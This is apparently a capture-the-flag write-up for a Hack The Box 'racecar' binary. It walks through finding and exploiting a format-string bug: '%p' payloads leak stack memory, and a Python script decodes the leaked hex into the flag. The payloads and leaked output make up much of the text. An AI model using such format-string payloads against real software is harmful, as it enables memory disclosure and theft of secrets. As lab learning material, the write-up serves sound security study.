> Did you know that racecar spelled backwards is racecar? Well, now that you know everything about racing, win this race and get the flag!
#### Steps
1. Unzip the file, password `hackthebox` (given)
2. We get an ELF executable for racecar
3. Connecting to the instance through netcat and playing a few times, I found that you wil always win if you choose car 1 and race 2 or vice versa
4. After winning, it allows for user input
5. Running strings on `racecar` there a couple interesting lines about flags, one just being flag.txt
```
└─$ strings racecar | grep flag
flag.txt
%s[-] Could not open flag.txt. Please contact the creator.
```
7. Next I used radare2 with these commands to look at the main function
```
[0x00000790]> aaa
[0x00000790]> s main
[0x000013e1]> pdf
```
7. I didn't find much of interest here
8. Other note: after messing w the instance a few times, I noticed that you win the race evry time as long as you pick the first car and second race or vice versa (this is probably evident in source code, but I don't have any reverse engineering software rn so I'm improvising)
9. I decided to text for common issues with pwn CTFs (format string) and it worked!
10. Format string proof of concept:
```
[!] Do you have anything to say to the press after your big victory?                       
> %x%x%x                                                                                                                                                       

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
575831c017056617d85
```
11. This is where the source code comes in
12. First, I made a `flag.txt` file that contained a bunch of `AAAAAA`
13. Running the executable locally:
```
[!] Do you have anything to say to the press after your big victory?                                                     
> %p %p %p %p %p %p %p %p %p %p %p %p %p %p                                                                                                                    

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
0x56ba0200 0x170 0x56618d85 0x8 0x60 0x26 0x1 0x2 0x5661996c 0x56ba0200 0x56ba0380 0x41414141 0x41414141 0x41414141
```
14. `%p` is for pointers
15. Since `41` is the hex representation of `A`. I know where the `flag.txt` file starts on the stack
16. The flag starts at the 12th address
17. Running on the instance
```
[!] Do you have anything to say to the press after your big victory?                                                               
> %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p                                                                 

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
0x56ed81c0 0x170 0x5661ed85 (nil) 0x1f 0x26 0x1 0x2 0x5661f96c 0x56ed81c0 0x56ed8340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0x39c6d200 0xf7fa93fc 0x56621f8c 0xffa19fd8 0x5661f441 0x1 0xffa1a084 0xffa1a08c 0x39c6d200
```
18. (excluded the nil part and everything before to make decoding easier)
19. Script for decoding the flag:
```python
import re

enc_flag = "0x1f 0x26 0x1 0x2 0x5661f96c 0x56ed81c0 0x56ed8340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0x39c6d200 0xf7fa93fc 0x56621f8c 0xffa19fd8 0x5661f441 0x1 0xffa1a084 0xffa1a08c 0x39c6d200"
enc_flag = enc_flag.split()[::-1]

# iterate over each chunk, convert hexadecimal characters to ASCII, and reverse the order
flag = []
for chunk in enc_flag:
    hex_chars = re.findall('..', chunk)
    
    flag_chunk = "".join(chr(int(char, 16)) for char in hex_chars[::-1] if char != '0x')
    flag.append(flag_chunk)

flag.reverse()
print(''.join(flag))
```
20. Done!
```
└─$ python3 dcdflag.py
&lùaVÀíV@íVHTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_XXXXXXX}ÒÆ9üú÷bVØ¡ÿAôaV ¡ÿ ¡ÿÒÆ9
```
